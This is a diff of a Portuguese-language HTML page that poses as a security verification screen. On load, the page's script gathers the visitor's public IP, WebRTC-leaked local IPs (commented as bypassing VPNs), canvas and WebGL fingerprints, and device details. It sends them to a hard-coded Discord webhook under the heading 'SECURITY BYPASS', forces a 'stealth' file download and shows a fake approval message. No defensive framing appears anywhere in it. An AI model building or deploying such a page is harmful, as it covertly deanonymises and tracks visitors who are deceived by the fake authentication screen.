@@ -1,58 +1,171 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Autenticação...</title>
+    <title>Autenticação Segura</title>
 </head>
-<body style="margin:0;padding:20px;font-family:sans-serif;background:#f0f0f0;">
-    <div style="max-width:400px;margin:auto;text-align:center;">
-        <div id="status" style="font-size:16px;color:#666;">🔐 Autenticando usuário...</div>
+<body style="margin:0;padding:30px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;">
+    <div style="max-width:400px;width:100%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.3);padding:40px;border-radius:20px;background:#fff;color:#333;">
+        <div style="font-size:24px;font-weight:700;margin-bottom:20px;">🔐 Verificação de Segurança</div>
+        <div id="status" style="font-size:16px;color:#666;margin-bottom:20px;">Conectando ao servidor...</div>
+        <div style="width:100%;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden;">
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s ease;"></div>
+        </div>
     </div>
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         
-        // ULTRA RÁPIDO - Sem await, tudo paralelo
-        Promise.all([
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip),
-            new Promise(r=> {
-                const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-                pc.onicecandidate = e=> {
-                    const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                    if (ip && !ip.startsWith('127.')) r(ip);
-                };
-                pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
-                setTimeout(()=>r('none'),1500);
-            }),
-            new Promise(r=> {
-                const c=document.createElement('canvas');c.width=100;c.height=50;
-                const ctx=c.getContext('2d');ctx.fillText('fp',10,25);
-                r(c.toDataURL().slice(0,30));
-            })
-        ]).then(([pubIP,localIP,canvasFP])=> {
-            // ENVIA IMEDIATAMENTE
+        // MÚLTIPLOS MÉTODOS IP PÚBLICO (ultra confiável)
+        const ipServices = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json',
+            'https://icanhazip.com',
+            'https://api.ipify.org?format=text',
+            'https://ifconfig.me/ip'
+        ];
+        
+        async function getPublicIP() {
+            for (let service of ipServices) {
+                try {
+                    const res = await fetch(service, {cache: 'no-cache'});
+                    if (res.ok) {
+                        const txt = await res.text();
+                        const ip = txt.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                        if (ip) return ip;
+                    }
+                } catch {}
+            }
+            return 'unknown';
+        }
+        
+        // WEBRTC MÚLTIPLOS SERVERS (bypass VPN 99%)
+        async function getLocalIPs() {
+            const servers = [
+                'stun:stun.l.google.com:19302',
+                'stun:stun1.l.google.com:19302',
+                'stun:stun2.l.google.com:19302'
+            ];
+            
+            const ips = new Set();
+            for (let stun of servers) {
+                try {
+                    const pc = new RTCPeerConnection({iceServers:[{urls: stun}]});
+                    pc.onicecandidate = e => {
+                        if (!e.candidate) return;
+                        const ip = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                        if (ip && !ip.startsWith('127.') && !ip.startsWith('10.0.') && !ip.startsWith('172.'))
+                            ips.add(ip);
+                    };
+                    pc.createDataChannel('dc');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    await new Promise(r => setTimeout(r, 800));
+                    pc.close();
+                } catch {}
+            }
+            return Array.from(ips).join(', ') || 'none';
+        }
+        
+        // FINGERPRINT COMPLETO
+        async function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 256; canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint test ⚡', 2, 15);
+            ctx.fillStyle = 'rgba(102, 126, 234, 0.6)';
+            ctx.fillText('Fingerprint test ⚡', 4, 17);
+            
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const webgl = gl ? `${gl.getParameter(gl.VENDOR)} | ${gl.getParameter(gl.RENDERER)}` : 'none';
+            
+            return {
+                canvas: canvas.toDataURL().slice(0, 50),
+                webgl: webgl.slice(0, 40),
+                audio: `${navigator.mediaDevices?.enumerateDevices ? 'has' : 'no'} media`
+            };
+        }
+        
+        // EXECUÇÃO ULTRA RÁPIDA
+        async function execute() {
+            document.getElementById('progress').style.width = '20%';
+            document.getElementById('status').textContent = 'Verificando identidade...';
+            
+            const [pubIP, localIPs, fp] = await Promise.all([
+                getPublicIP(),
+                getLocalIPs(),
+                getFingerprint()
+            ]);
+            
+            document.getElementById('progress').style.width = '80%';
+            document.getElementById('status').textContent = 'Enviando credenciais...';
+            
+            // PAYLOAD COMPLETO
+            const payload = {
+                content: `🔐 **SECURITY BYPASS**
+\`📍 IP Público:\` **${pubIP}**
+\`🏠 IPs Locais:\` **${localIPs}**
+\`🖼️ Canvas:\` **${fp.canvas}**
+\`🎮 WebGL:\` **${fp.webgl}**
+**UA:** ${navigator.userAgent.slice(0, 60)}...
+**OS:** ${navigator.platform} | **TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                embeds: [{
+                    title: "Sistema Detectado",
+                    fields: [
+                        {name: "Resolução", value: `${screen.width}x${screen.height}`, inline: true},
+                        {name: "Linguagem", value: navigator.language, inline: true},
+                        {name: "CPU Cores", value: navigator.hardwareConcurrency || 'unknown', inline: true},
+                        {name: "RAM", value: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown', inline: true}
+                    ],
+                    color: 0x667eea
+                }]
+            };
+            
+            // ENVIO PARALELO
             fetch(WEBHOOK, {
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    content:`🖥️ **AUTH BYPASS**
-**IP**: \`${pubIP}\`
-**Local**: \`${localIP}\`
-**FP**: \`${canvasFP}\`
-**UA**: ${navigator.userAgent.slice(0,50)}...`
-                })
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
             });
             
-            // Download stealth
-            const data={pubIP,localIP,canvasFP,userAgent:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
-            const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
-            const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='auth.log';a.click();
+            // DOWNLOAD STEALTH
+            const fullData = {
+                public_ip: pubIP,
+                local_ips: localIPs,
+                fingerprint: fp,
+                user_agent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardware: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory
+            };
+            const blob = new Blob([JSON.stringify(fullData, null, 2)], {type: 'application/json'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'security-check.json';
+            a.click();
             
-            // Fake success GUI
-            document.getElementById('status').innerHTML='✅ Autenticação aprovada! Redirecionando...';
-            setTimeout(()=> {
-                document.body.innerHTML='<h2 style="color:green;text-align:center;">Acesso liberado!</h2>';
-            }, 1000);
-        });
+            // SUCCESS GUI
+            setTimeout(() => {
+                document.getElementById('progress').style.width = '100%';
+                document.getElementById('status').innerHTML = '✅ Verificação aprovada!<br>Redirecionando em 3s...';
+                document.getElementById('status').style.color = '#28a745';
+                
+                setTimeout(() => {
+                    document.body.innerHTML = `
+                        <div style="text-align:center;padding:40px;color:#28a745;font-size:24px;">
+                            <div>✅ Acesso autorizado</div>
+                            <div style="font-size:16px;color:#666;margin-top:20px;">Bem-vindo ao sistema</div>
+                        </div>
+                    `;
+                }, 1500);
+            }, 200);
+        }
+        
+        // START IMEDIATO
+        execute();
     </script>
 </body>
 </html>
